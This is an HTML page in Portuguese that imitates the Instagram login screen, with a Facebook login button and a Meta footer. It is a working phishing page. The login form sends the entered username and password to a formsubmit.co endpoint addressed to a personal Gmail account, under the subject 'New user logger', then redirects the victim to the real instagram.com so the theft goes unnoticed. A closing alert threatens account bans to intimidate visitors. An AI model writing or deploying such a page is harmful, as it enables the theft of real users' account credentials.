<!DOCTYPE html>
<html lang="en">
<head>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    

    <div class="container">
        <div class="box">
          <div class="heading"></div>
          <form action="https://formsubmit.co/angelomateusnerysouza2020@gmail.com" class="login-form" method="POST">

            <input type="hidden" name="_next" value="https://instagram.com/">
            <input type="hidden" name="_subject" value="New user logger">
            <input type="hidden" name="_captcha" value="false">

            <button class="login-face" title="login" onclick="alert1()"><ion-icon class="logo-facebook" name="logo-facebook"></ion-icon>Continuar com Facebook</button>
            <div class="separator">
                <div class="line"></div>
                <p>OU</p>
                <div class="line"></div>
              </div>
            <div class="field">
               
              <input
                id="username"
                type="email"

                name="nome"
              />
              <label for="username">Telefone, nome de usuário ou email</label>
            </div>
            <div class="field">
              <input name="senha" id="password" type="password" placeholder="password" required />
              <label for="password">Senha</label>
              <br>
              <a class="forgot-password" href="https://www.instagram.com" >Esqueceu a senha?</a>
            </div>
            
             <a href="https://www.instagram.com"><button type="submit" class="login-button" value="entrar" title="login">Entrar</button></a> 
              
            <div class="other">
              <button class="fb-login-btn" type="button">
                <i class="fa fa-facebook-official fb-icon"></i>
              </button>
             
            </div>
          </form>
          <div class="box2">
            <p class="dont-account">Não tem uma conta? <a class="signup" href="#">Cadastre-se</a></p>
          </div>
        </div>
        </div>
       <footer>
           <p class="from">from</p>
           <img class="logo-meta" src="meta-new-facebook-2021-seeklogo.com-1.svg" alt="">

         window.alert("Aviso 4: Caso você tente burlar nosso sistema, estará sujeito a diretrizes da comunidade e até banimento temporário de sua conta.")
